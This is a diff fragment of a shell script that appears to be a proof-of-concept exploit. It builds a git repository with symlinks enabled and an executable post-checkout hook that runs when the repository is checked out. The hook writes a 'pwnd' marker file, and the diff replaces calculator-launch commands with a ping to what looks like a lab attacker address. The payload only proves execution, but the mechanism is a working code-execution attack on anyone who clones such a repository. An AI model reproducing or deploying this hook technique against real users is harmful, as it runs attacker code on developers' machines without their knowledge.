@@ -6,7 +6,6 @@ git config --global core.symlinks true
 # optional, but I added it to avoid the warning message
 git config --global init.defaultBranch main 
 
-
 # Define the tell-tale path
 tell_tale_path="$PWD/tell.tale"
 
@@ -19,8 +18,7 @@ mkdir -p y/hooks
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+ping -c 4 10.10.14.19
 EOF
 
 # Make the hook executable: important
